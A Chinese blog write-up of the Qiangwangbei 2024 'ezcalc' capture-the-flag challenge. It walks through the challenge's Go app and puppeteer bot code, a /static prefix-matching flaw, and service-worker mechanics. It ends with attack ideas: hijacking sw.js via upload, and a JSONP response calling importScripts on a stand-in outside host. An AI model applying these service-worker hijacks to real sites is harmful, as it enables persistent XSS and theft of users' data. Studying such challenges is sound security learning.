@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="从强网杯2024_ezcalc学service-worker附件下载：https:&#x2F;&#x2F;github.com&#x2F;CTF-Archives&#x2F;2024-qwbs8 环境搭建windows+webstorm   搭建bot linux+goland 搭建app 分析app只分析关键路由 初始化123456789101112131415161718192021222324252627282930var err">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯 ezcalc">
+<meta property="og:url" content="http://example.com/2024/11/04/%E4%BB%8E%E5%BC%BA%E7%BD%91%E6%9D%AF2024_ezcalc%E5%AD%A6service-worker/index.html">
+<meta property="og:site_name" content="Charger0">
+<meta property="og:description" content="从强网杯2024_ezcalc学service-worker附件下载：https:&#x2F;&#x2F;github.com&#x2F;CTF-Archives&#x2F;2024-qwbs8 环境搭建windows+webstorm   搭建bot linux+goland 搭建app 分析app只分析关键路由 初始化123456789101112131415161718192021222324252627282930var err">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025731429-01f70d16-d0a4-423d-8600-66f4cf8b252e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025822918-46f86494-0cf0-4c6a-9238-16f50d9fa323.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025982655-c07ab80e-563d-48d8-866d-192e124a1f14.png">
+<meta property="article:published_time" content="2024-11-04T19:38:24.000Z">
+<meta property="article:modified_time" content="2024-11-13T09:51:02.878Z">
+<meta property="article:author" content="Charger0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025731429-01f70d16-d0a4-423d-8600-66f4cf8b252e.png">
+
+<link rel="canonical" href="http://example.com/2024/11/04/%E4%BB%8E%E5%BC%BA%E7%BD%91%E6%9D%AF2024_ezcalc%E5%AD%A6service-worker/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>强网杯 ezcalc | Charger0</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Charger0</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">技术记录</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/04/%E4%BB%8E%E5%BC%BA%E7%BD%91%E6%9D%AF2024_ezcalc%E5%AD%A6service-worker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Charger0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Charger0">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          强网杯 ezcalc
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-11-05 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-05T03:38:24+08:00">2024-11-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-11-13 17:51:02" itemprop="dateModified" datetime="2024-11-13T17:51:02+08:00">2024-11-13</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="从强网杯2024-ezcalc学service-worker"><a href="#从强网杯2024-ezcalc学service-worker" class="headerlink" title="从强网杯2024_ezcalc学service-worker"></a>从强网杯2024_ezcalc学service-worker</h2><p>附件下载：<a target="_blank" rel="noopener" href="https://github.com/CTF-Archives/2024-qwbs8">https://github.com/CTF-Archives/2024-qwbs8</a></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>windows+webstorm   搭建bot</p>
+<p>linux+goland 搭建app</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="app"><a href="#app" class="headerlink" title="app"></a>app</h4><p>只分析关键路由</p>
+<h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var err error</span><br><span class="line">db, err = gorm.Open(sqlite.Open(&quot;database.db&quot;), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">	panic(&quot;failed to connect database&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = db.AutoMigrate(&amp;Screenshot&#123;&#125;, &amp;Report&#123;&#125;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">	panic(&quot;failed to migrate database&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r := gin.Default()</span><br><span class="line">r.LoadHTMLGlob(&quot;templates/*&quot;)</span><br><span class="line"></span><br><span class="line">r.Use(func(c *gin.Context) &#123;</span><br><span class="line">	host := c.Request.Host</span><br><span class="line">	if host == &quot;&quot; &#123;</span><br><span class="line">		c.JSON(http.StatusBadRequest, &quot;Bad Request&quot;)</span><br><span class="line">		c.Abort()</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	nonce := RandStringRunes(32)</span><br><span class="line">	c.Set(&quot;nonce&quot;, &quot;&quot;)</span><br><span class="line">	c.Header(&quot;Content-Security-Policy&quot;, fmt.Sprintf(&quot;default-src &#x27;none&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;nonce-%s&#x27;; style-src &#x27;unsafe-inline&#x27; &#x27;self&#x27;; img-src &#x27;self&#x27; data: blob:; connect-src &#x27;self&#x27;; frame-src &#x27;none&#x27;; base-uri &#x27;none&#x27;; manifest-src &#x27;none&#x27;; object-src &#x27;none&#x27;;&quot;, nonce))</span><br><span class="line">	c.Header(&quot;X-Content-Type-Options&quot;, &quot;nosniff&quot;)</span><br><span class="line">	c.Header(&quot;X-Frame-Options&quot;, &quot;DENY&quot;)</span><br><span class="line">	c.Header(&quot;Cross-Origin-Opener-Policy&quot;, &quot;same-origin&quot;)</span><br><span class="line">	c.Next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>连接sqlite，生成nonce，设置CSP头。</p>
+<h5 id="static"><a href="#static" class="headerlink" title="&#x2F;static"></a>&#x2F;static</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r.Use(StaticMiddleware(&quot;/static&quot;, &quot;static&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func StaticMiddleware(relativePath, root string) gin.HandlerFunc &#123;</span><br><span class="line">	return func(c *gin.Context) &#123;</span><br><span class="line">		if strings.HasPrefix(c.Request.URL.Path, relativePath) &#123;</span><br><span class="line">			fs := gin.Dir(root, false)</span><br><span class="line">			fileServer := http.StripPrefix(relativePath, http.FileServer(fs))</span><br><span class="line">			fileServer.ServeHTTP(c.Writer, c.Request)</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			c.Next()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;static处理逻辑是  strings.HasPrefix()来匹配路由是否以&#x2F;static开头，这里存在一个漏洞，后续我们会用到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问/static/1.js        正常处理会返回/static/1.js</span><br><span class="line">访问/static1.js 		  同样会返回 /static/1.js</span><br></pre></td></tr></table></figure>
+
+<h5 id="api-screen-upload"><a href="#api-screen-upload" class="headerlink" title="&#x2F;api&#x2F;screen&#x2F;upload"></a>&#x2F;api&#x2F;screen&#x2F;upload</h5><pre><code>r.POST(&quot;/api/screenshot/upload&quot;, func(c *gin.Context) &#123;
+    file, err := c.FormFile(&quot;file&quot;)
+    if err != nil &#123;
+        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid file&quot;&#125;)
+        return
+    &#125;
+
+    if file.Size &gt; 1*1024*1024 &#123;
+        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;File size too large&quot;&#125;)
+        return
+    &#125;
+
+    dir := filepath.Join(&quot;static&quot;)
+
+    if err := os.MkdirAll(dir, os.ModePerm); err != nil &#123;
+        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
+        return
+    &#125;
+
+    id := uuid.New().String()
+    ext := filepath.Ext(file.Filename)
+
+    for _, item := range blacklistedExt &#123;
+        if strings.EqualFold(item, ext) &#123;
+            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Not allowed to upload this file type&quot;&#125;)
+            return
+        &#125;
+    &#125;
+
+    dst := filepath.Join(dir, id+ext)
+    src, err := file.Open()
+    if err != nil &#123;
+        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
+        return
+    &#125;
+    defer src.Close()
+    data, err := io.ReadAll(src)
+    if err != nil &#123;
+        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
+        return
+    &#125;
+
+    contentType := http.DetectContentType(data)
+    if !strings.HasPrefix(contentType, &quot;image/&quot;) &#123;
+        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid file type&quot;&#125;)
+        return
+    &#125;
+
+    out, err := os.Create(dst)
+    if err != nil &#123;
+        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
+        return
+    &#125;
+    defer out.Close()
+
+    _, err = io.Copy(out, bytes.NewReader(data))
+    if err != nil &#123;
+        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
+        return
+    &#125;
+
+    screenshot := Screenshot&#123;
+        ID:   id,
+        Path: dst,
+    &#125;
+
+    if err := db.Create(&amp;screenshot).Error; err != nil &#123;
+        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
+        return
+    &#125;
+
+    c.JSON(http.StatusOK, gin.H&#123;&quot;status&quot;: &quot;ok&quot;, &quot;data&quot;: screenshot&#125;)
+&#125;)
+</code></pre>
+<p>可上传文件到&#x2F;static目录下，文件名不可控，类型有校验</p>
+<h5 id="api-report"><a href="#api-report" class="headerlink" title="&#x2F;api&#x2F;report"></a>&#x2F;api&#x2F;report</h5><pre><code>r.POST(&quot;/api/report&quot;, func(c *gin.Context) &#123;
+    var req ReportRequest
+    if err := c.BindJSON(&amp;req); err != nil &#123;
+        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid request&quot;&#125;)
+        return
+    &#125;
+
+    report := Report&#123;
+        ID:          uuid.New().String(),
+        Expression:  req.Expression,
+        Result:      req.Result,
+        Email:       req.Email,
+        Comment:     req.Comment,
+        CheckResult: &quot;waiting&quot;,
+    &#125;
+
+    for _, id := range req.Screenshots &#123;
+        var screenshot Screenshot
+        if err := db.Where(&quot;id =?&quot;, id).First(&amp;screenshot).Error; err != nil &#123;
+            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Screenshot not found&quot;&#125;)
+            return
+        &#125;
+        if screenshot.ReportID != &quot;&quot; &#123;
+            c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Screenshot already associated with a report&quot;&#125;)
+            return
+        &#125;
+
+        screenshot.ReportID = report.ID
+        if err := db.Save(&amp;screenshot).Error; err != nil &#123;
+            c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
+            return
+        &#125;
+    &#125;
+
+    if err := db.Create(&amp;report).Error; err != nil &#123;
+        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)
+        return
+    &#125;
+
+    reportMutex.Lock()
+    if reportGoroutineCount &gt;= 32 &#123;
+        reportMutex.Unlock()
+        c.JSON(http.StatusTooManyRequests, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Too many requests&quot;&#125;)
+        return
+    &#125;
+    reportMutex.Unlock()
+
+    go func() &#123;
+        reportMutex.Lock()
+        reportGoroutineCount++
+        reportMutex.Unlock()
+        defer func() &#123;
+            reportMutex.Lock()
+            reportGoroutineCount--
+            reportMutex.Unlock()
+        &#125;()
+
+        req, err := http.NewRequest(&quot;GET&quot;, &quot;http://192.168.233.1:52000/api/bot&quot;, nil)
+        if err != nil &#123;
+            report.CheckResult = &quot;error&quot;
+            db.Save(&amp;report)
+            return
+        &#125;
+        q := req.URL.Query()
+        q.Add(&quot;expr&quot;, report.Expression)
+        req.URL.RawQuery = q.Encode()
+
+        client := &amp;http.Client&#123;&#125;
+        resp, err := client.Do(req)
+        if err != nil &#123;
+            report.CheckResult = &quot;error&quot;
+            db.Save(&amp;report)
+            return
+        &#125;
+
+        defer resp.Body.Close()
+
+        if resp.StatusCode != http.StatusOK &#123;
+            report.CheckResult = &quot;error&quot;
+            db.Save(&amp;report)
+            return
+        &#125;
+
+        resBody, err := io.ReadAll(resp.Body)
+        if err != nil &#123;
+            report.CheckResult = &quot;error&quot;
+            db.Save(&amp;report)
+            return
+        &#125;
+
+        report.CheckResult = string(resBody)
+        db.Save(&amp;report)
+    &#125;()
+
+    c.JSON(http.StatusOK, gin.H&#123;&quot;status&quot;: &quot;ok&quot;, &quot;data&quot;: gin.H&#123;&quot;id&quot;: report.ID&#125;&#125;)
+&#125;)
+</code></pre>
+<p>发送请求给bot。</p>
+<h4 id="bot"><a href="#bot" class="headerlink" title="bot"></a>bot</h4><h5 id="api-bot"><a href="#api-bot" class="headerlink" title="&#x2F;api&#x2F;bot"></a>&#x2F;api&#x2F;bot</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">  let expr = req.query.expr;</span><br><span class="line"></span><br><span class="line">  if (!expr || typeof expr !== &#x27;string&#x27;) &#123;</span><br><span class="line">      res.json(&#123; status: &#x27;error&#x27;, message: &#x27;Missing expr query parameter&#x27; &#125;);</span><br><span class="line">      return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line">      let browser = await puppeteer.launch(&#123;</span><br><span class="line">          executablePath: &#x27;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&#x27;,</span><br><span class="line">	headless: true,</span><br><span class="line">	args: [</span><br><span class="line">		&quot;--no-sandbox&quot;,</span><br><span class="line">		&quot;--disable-setuid-sandbox&quot;,</span><br><span class="line">              &quot;--disable-crashpad&quot;,</span><br><span class="line">		&quot;--js-flags=--noexpose_wasm,--jitless&quot;</span><br><span class="line">	]</span><br><span class="line">&#125;);</span><br><span class="line">      let page = await browser.newPage();</span><br><span class="line">      await page.goto(`https://192.168.79.129:9000/`, &#123; waitUntil: &#x27;networkidle2&#x27; &#125;);</span><br><span class="line">      await sleep(1000);</span><br><span class="line">      await page.focus(&#x27;input&#x27;);</span><br><span class="line">      await page.keyboard.type(expr);</span><br><span class="line">      await sleep(100);</span><br><span class="line">      await page.click(&#x27;button&#x27;);</span><br><span class="line">      await sleep(2000);</span><br><span class="line">      const result = await page.evaluate(() =&gt; &#123;</span><br><span class="line">          const span = document.querySelector(&#x27;.ant-alert-message&#x27;);</span><br><span class="line">          if (!span) &#123;</span><br><span class="line">              return false;</span><br><span class="line">          &#125;</span><br><span class="line">          return span.textContent === &#x27;114514&#x27;;</span><br><span class="line">      &#125;);</span><br><span class="line">      if (!result) &#123;</span><br><span class="line">          res.json(&#123; status: &#x27;error&#x27;, message: &#x27;Result not found or invalid&#x27; &#125;);</span><br><span class="line">          await page.close();</span><br><span class="line">          await browser.close();</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      if (result) &#123;</span><br><span class="line">          await page.close();</span><br><span class="line">          page = await browser.newPage();</span><br><span class="line">          await page.goto(`https://192.168.79.129:9000/`, &#123; waitUntil: &#x27;networkidle2&#x27; &#125;);</span><br><span class="line">          await sleep(1000);</span><br><span class="line">          await page.focus(&#x27;input&#x27;);</span><br><span class="line">          await page.keyboard.type(`&quot;$&#123;readFileSync(&#x27;/bot/flag&#x27;, &#x27;utf-8&#x27;)&#125;&quot;`, &#123; delay: 100 &#125;);</span><br><span class="line">          await sleep(100);</span><br><span class="line">          await page.click(&#x27;button&#x27;);</span><br><span class="line">          await sleep(1000);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      await page.close();</span><br><span class="line">      await browser.close();</span><br><span class="line">      </span><br><span class="line">      res.json(&#123; status: &#x27;success&#x27; &#125;);</span><br><span class="line">  &#125; catch (error) &#123;</span><br><span class="line">      console.error(`[-] Bot failed to visit: $&#123;error&#125;`);</span><br><span class="line">      res.json(&#123; status: &#x27;error&#x27;, message: &#x27;Bot failed to visit&#x27; &#125;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>接受来自app的请求，提取req中的expr，作为参数去浏览器模拟访问app calc。如果请求结果是114514，则再开一个请求，将flag输入到expr元素中。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>怎么劫持bot在expr中的输入？</p>
+<p>思路1：控制&#x2F;templates&#x2F;index.tpl   利用上传功能点去覆盖 。但app服务端对上传的文件目录锁在了static且文件名随机了。</p>
+<p>没有思路，如果不了解service-worker。</p>
+<h3 id="service-worker"><a href="#service-worker" class="headerlink" title="service-worker"></a>service-worker</h3><p>sw 经注册到”浏览器”(存疑) 后，可作为代理中间人拦截修改请求。</p>
+<p>浏览器启动时会检测是否支持并注册有SW，若有，则优先加载SW。</p>
+<p>chrome:&#x2F;&#x2F;serviceworker-internals&#x2F;</p>
+<p>edge:&#x2F;&#x2F;serviceworker-internals&#x2F;</p>
+<p>可以看SW名单及所属域</p>
+<p>正常页面的注册流程</p>
+<p>&#x2F;index</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025731429-01f70d16-d0a4-423d-8600-66f4cf8b252e.png" alt="img"></p>
+<p>&#x2F;index-&gt;&#x2F;js&#x2F;sw-registration.js</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025822918-46f86494-0cf0-4c6a-9238-16f50d9fa323.png" alt="img"></p>
+<p>&#x2F;index-&gt;&#x2F;js&#x2F;sw-registration.js-&gt;&#x2F;sw.js</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26908589/1731025982655-c07ab80e-563d-48d8-866d-192e124a1f14.png" alt="img"></p>
+<p>检测一个网站是否已存在sw模块。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (&#x27;serviceWorker&#x27; in navigator) &#123;</span><br><span class="line">  navigator.serviceWorker.register(&#x27;/sw.js&#x27;).then(function(registration) &#123;</span><br><span class="line">    console.log(&#x27;ServiceWorker registration successful with scope: &#x27;,    registration.scope);</span><br><span class="line">  &#125;).catch(function(err) &#123;</span><br><span class="line">    console.log(&#x27;ServiceWorker registration failed: &#x27;, err);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>service-worker的解析scope</p>
+<p>在网页中，如果没有显式地引入 <code>sw.js</code> 文件，浏览器通常不会默认解析它并将其作为 Service Worker 来处理。</p>
+<p>Service Worker 的注册是一个明确的操作，一般需要在网页的 JavaScript 代码中通过类似以下方式进行注</p>
+<p>测。Service Worker 相关的解析和注册信息主要存储在客户端浏览器中，而不是在服务端。</p>
+<p>出于安全考量，Service workers有一些限制：</p>
+<ol>
+<li>只能注册同源下的js</li>
+<li>网站必须是<code>**https://**</code>或者<code>**http://localhost/**</code></li>
+<li>content-type 为 *&#x2F;javascript</li>
+<li>Worker 线程不能获得下列对象：DOM对象，Windows对象，document对象，parent对象。</li>
+</ol>
+<p>sw.js注册函数</p>
+<p><strong>ServiceWorkerContainer</strong>.register(<strong>scriptURL</strong>, <strong>options</strong>) </p>
+<p><strong>navigator</strong>.serviceWorker.register(<strong>scriptURL</strong>, <strong>options</strong>) #返回一个<strong>ServiceWorkerContainer</strong>对象。</p>
+<h4 id="浏览器模型-持久化xss基础-先知社区"><a href="#浏览器模型-持久化xss基础-先知社区" class="headerlink" title="浏览器模型 持久化xss基础 - 先知社区"></a>浏览器模型 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8679?time__1311=n4+xnD0DcDu70=eRq05+tOeeiKqD5teqtPQx#toc-1">持久化xss基础 - 先知社区</a></h4><p>多进程(模块)：</p>
+<ol>
+<li><p>浏览器主进程  主控和调用，创建和销毁其他进</p>
+</li>
+<li><p>GPU进程 </p>
+</li>
+<li><p>渲染进程  每个tab 一个进程 下属五个线程：</p>
+</li>
+<li><p>GUI 线程  复制页面渲染 加载html生成dom树，加载css生成css树，两树拼接后，计算node位置(重排)，渲染node图像(重绘)。与js线程互斥，防止JS执行改变dom而gui不知。</p>
+</li>
+<li><p>js线程  执行js。v5之前是单线程，为了提高cpu效率，提出多线程。js多线程为主线程开子线程，限制子线程资源。service-worker正是子线程，因此受到限制。</p>
+</li>
+</ol>
+<ul>
+<li>DOM对象</li>
+<li>window对象的某些属性和方法</li>
+<li>documen对象</li>
+<li>parent对象</li>
+</ul>
+<ol>
+<li><p>定时触发的线程</p>
+</li>
+<li><p>异步请求线程</p>
+</li>
+<li><p>事件触发的线程</p>
+</li>
+<li><p>插件进程</p>
+</li>
+</ol>
+<h4 id="潜在攻击点1-文件上传劫持sw-js-sw-registration-js"><a href="#潜在攻击点1-文件上传劫持sw-js-sw-registration-js" class="headerlink" title="潜在攻击点1 文件上传劫持sw.js&#x2F;sw-registration.js"></a>潜在攻击点1 文件上传劫持sw.js&#x2F;sw-registration.js</h4><p>升级成存储型XSS获取敏感信息。</p>
+<h4 id="攻击点2-Jsonp注册sw"><a href="#攻击点2-Jsonp注册sw" class="headerlink" title="攻击点2 Jsonp注册sw"></a>攻击点2 Jsonp注册sw</h4><p>Jsonp可跨域访问接口。我们可以自己开一个接口，使得调用该接口返回的内容为importScripts(&#x2F;&#x2F;a.com&#x2F;xx.js)</p>
+<p>进而注册sw。</p>
